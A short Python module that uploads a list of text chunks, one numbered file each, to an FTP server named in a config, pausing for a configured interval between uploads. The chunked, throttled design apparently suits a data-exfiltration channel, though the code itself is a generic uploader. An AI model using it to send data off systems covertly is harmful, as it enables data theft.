from ftplib import FTP
import time
import io

def send(chunks, config):
    ftp = FTP()
    ftp.connect(config["ftp_server"], config["ftp_port"])
    ftp.login(config["ftp_user"], config["ftp_pass"])

    for i, chunk in enumerate(chunks):
        filename = f"chunk_{i}.txt"
        data = io.BytesIO(chunk.encode())
        try:
            ftp.storbinary(f"STOR {filename}", data)
        except Exception as e:
            print(f"[!] FTP upload failed for {filename}: {e}")
        time.sleep(config["throttle_seconds"])

    ftp.quit()
